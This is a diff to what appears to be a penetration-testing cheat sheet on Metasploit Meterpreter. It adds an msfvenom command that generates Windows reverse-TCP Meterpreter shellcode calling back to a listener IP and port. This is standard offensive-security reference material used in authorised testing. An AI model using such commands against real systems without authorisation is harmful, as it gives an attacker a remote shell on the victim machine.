@@ -115,6 +115,11 @@ Meterpreter payloads are also divided into stagged and inline versions. However,
 msfvenom --list payloads | grep meterpreter
 ```
 
+**Generate shellcode for windows**
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -b "\x00\x0a" -f python -v payload
+```
+
 ---------------------------------------------------------
 
 **Meterpreter Commands**
